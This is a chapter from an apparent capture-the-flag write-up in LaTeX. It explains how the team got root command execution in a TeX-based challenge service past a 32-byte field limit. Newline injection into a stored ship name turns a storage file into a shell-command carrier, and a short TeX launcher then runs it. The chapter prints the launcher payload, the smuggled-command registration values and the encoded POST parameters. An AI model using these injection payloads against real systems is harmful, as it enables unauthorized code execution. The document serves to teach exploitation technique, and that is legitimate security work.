% ============================================================
% 06 -- BYPASSING THE 32-BYTE LIMIT
% ============================================================

\section{Bypassing the 32-Byte Limit}
\label{sec:carrier-bypass}

The previous chapter ended in an awkward position.

We had command execution as root inside the LAMP container, but the
component type only gave us enough space for very small payloads.

Something like:

\begin{lstlisting}
id>/x
\end{lstlisting}

was fine.

Something useful for locating and extracting flags was not.

Instead of trying to compress increasingly ridiculous shell commands
into the component field, we looked for somewhere else to store them.


% ------------------------------------------------------------
% 6.1
% ------------------------------------------------------------

\subsection{Ship Names Were Stored as TeX Files}

During registration, LAMP created a file for each user beneath
\code{/storage}:

\begin{lstlisting}
\immediate\openout\shipfile=/storage/\postusername{}

\store{\shipname}{\postshipname{}}

\immediate\closeout\shipfile{}
\end{lstlisting}

The intention was simply to persist the chosen ship name.

For a user named:

\begin{lstlisting}
Q
\end{lstlisting}

the corresponding file would live at approximately:

\begin{lstlisting}
/storage/Q.tex
\end{lstlisting}

and contain a definition of the ship-name macro.


% ------------------------------------------------------------
% 6.2
% ------------------------------------------------------------

\subsection{The Escaping Looked Reasonable}

Before writing the ship name, LAMP attempted to escape characters that
could interfere with the generated TeX:

\begin{lstlisting}
\StrSubstitute{#2}
  {\stringbackslash}
  {\string\Uchar92}
  [\escaped]

\StrSubstitute{\escaped}
  {\stringcurlyopen}
  {\string\Uchar123}
  [\escaped]

\StrSubstitute{\escaped}
  {\stringcurlyclose}
  {\string\Uchar125}
  [\escaped]

\StrSubstitute{\escaped}
  {\stringsub}
  {\string\Uchar95}
  [\escaped]

\StrSubstitute{\escaped}
  {\stringsup}
  {\string\Uchar94}
  [\escaped]
\end{lstlisting}

So characters such as:

\begin{lstlisting}
\  {  }  _  ^
\end{lstlisting}

were transformed before being written.

There was, however, one useful character missing from that list:

\begin{center}
  \displayfont\bfseries
  newline.
\end{center}


% ------------------------------------------------------------
% 6.3
% ------------------------------------------------------------

\subsection{Newline Injection}

A ship name beginning with a newline could therefore change the physical
layout of the generated file.

Conceptually, registering a ship name like:

\begin{lstlisting}

ls /storage>/x;:
\end{lstlisting}

could produce a file resembling:

\begin{lstlisting}
\def \shipname {
ls /storage>/x;:}
\end{lstlisting}

As TeX, this file was malformed enough to be inconvenient.

As a shell script, however, the middle of it contained something much
more useful:

\begin{lstlisting}
ls /storage>/x
\end{lstlisting}

The surrounding TeX syntax could fail.

The shell command in the middle had already executed.


% ------------------------------------------------------------
% 6.4
% ------------------------------------------------------------

\subsection{The Storage File Became a Command Carrier}

This gave us a way to separate the exploit into two pieces.

The long command lived inside the user's storage file:

\begin{lstlisting}
/storage/Q.tex
\end{lstlisting}

The tiny component-type payload only needed to launch it:

\begin{lstlisting}
^^5cUseName{@@input}|"sh /s*/Q*"
\end{lstlisting}

After TeX processing, the important part became:

\begin{lstlisting}
\UseName{@@input}|"sh /s*/Q*"
\end{lstlisting}

The shell glob:

\begin{lstlisting}
/s*/Q*
\end{lstlisting}

was a compact way of reaching the attacker-created file under
\code{/storage} without spending the limited payload budget on the
entire path.


% ------------------------------------------------------------
% 6.5
% ------------------------------------------------------------

\subsection{Why This Solved the Payload Problem}

The exploit now had two stages:

\begin{center}
\begin{tabular}{p{0.28\textwidth} p{0.58\textwidth}}
  \toprule
  \textbf{Stage} & \textbf{Purpose} \\
  \midrule

  Registration &
  Store an arbitrarily longer shell command inside
  \code{/storage/<user>.tex}. \\[0.6em]

  Component injection &
  Use the tiny TeX RCE primitive only to execute that file with
  \code{sh}. \\

  \bottomrule
\end{tabular}
\end{center}

The constrained field no longer needed to contain the real payload.

It only needed to contain a launcher.

\begin{findingbox}
The 32-byte component-type limit restricted the size of the direct TeX
payload, but it did not restrict the size of commands already present
elsewhere on disk.

Newline injection in persisted ship names turned
\code{/storage/<user>.tex} into a reusable shell-command carrier.
\end{findingbox}


% ------------------------------------------------------------
% 6.6
% ------------------------------------------------------------

\subsection{How the PoC Created a Carrier}

The automated exploit eventually reduced carrier creation to:

\begin{lstlisting}
ship=$'\n'"$shellcmd"
\end{lstlisting}

The resulting value was URL-encoded and sent during registration:

\begin{lstlisting}
username=Q
password=mof
shipname=<newline><shell command>
\end{lstlisting}

Once registration succeeded, the component injection triggered the
carrier:

\begin{lstlisting}
action=add
x=10
y=10
typ=^^5cUseName{@@input}|"sh%20/s*/Q*"
\end{lstlisting}

The \code{\%20} is important here.

LAMP's POST form parser percent-decoded values, but unlike the query
parser it did not convert a literal \code{+} into a space.

Using:

\begin{lstlisting}
sh+/s*/Q*
\end{lstlisting}

would therefore not reliably produce:

\begin{lstlisting}
sh /s*/Q*
\end{lstlisting}

Using \code{\%20} did.


% ------------------------------------------------------------
% 6.7
% ------------------------------------------------------------

\subsection{One Small Operational Caveat}

The short launcher relied on shell globbing:

\begin{lstlisting}
/s*/Q*
\end{lstlisting}

This was useful during the competition because every saved byte mattered.

It was not particularly elegant.

If multiple matching paths existed, shell expansion could produce more
than one argument and make the launcher unreliable.

\begin{limitationbox}
The short glob-based launcher was a competition optimization, not a
general-purpose robust execution method.

The cleaned PoC should prefer deterministic paths whenever the payload
budget allows it.
\end{limitationbox}


% ------------------------------------------------------------
% 6.8
% ------------------------------------------------------------

\subsection{The Final Primitive}

At this point, the exploit had everything required for useful command
execution:

\begin{center}
  \displayfont
  register account
  $\longrightarrow$
  newline in ship name
  $\longrightarrow$
  shell carrier in \code{/storage}
  $\longrightarrow$
  tiny \code{typ} launcher
  $\longrightarrow$
  root command
  $\longrightarrow$
  output file
  $\longrightarrow$
  \code{Path:} retrieval
\end{center}

The remaining question was no longer how to execute commands.

It was:

\begin{center}
  \displayfont\large\bfseries
  where the hell does LAMP actually keep the flags?
\end{center}